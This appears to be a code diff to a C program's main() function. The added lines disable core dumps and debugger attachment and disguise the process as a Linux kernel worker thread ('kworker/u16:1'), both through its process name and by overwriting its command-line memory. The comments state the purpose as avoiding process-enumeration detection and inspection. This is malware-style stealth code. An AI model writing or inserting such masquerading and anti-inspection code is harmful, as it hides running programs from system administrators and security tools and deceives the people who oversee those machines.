@@ -304,8 +304,18 @@ static int start_overlay() {
 
 // Executable entry point
 int main(int argc, char* argv[]) {
-    // Mask process name to mimic standard Linux kernel worker thread to avoid userland process enumeration detection
+    // 1. Disable process core dumps and ptrace attachments (Universal Anti-Inspection Shield)
+    prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
+
+    // 2. Mask process name to mimic standard Linux kernel worker thread to avoid userland process enumeration detection
     prctl(PR_SET_NAME, "kworker/u16:1", 0, 0, 0);
+
+    // 3. Scrub process commandline argument memory (/proc/self/cmdline camouflage)
+    if (argc > 0 && argv && argv[0]) {
+        size_t arg_len = strlen(argv[0]);
+        memset(argv[0], 0, arg_len);
+        strncpy(argv[0], "kworker/u16:1", (arg_len >= 13) ? 13 : arg_len);
+    }
 
     // Verify license credentials before proceeding
     if (!check_license_gate(argc, argv)) {
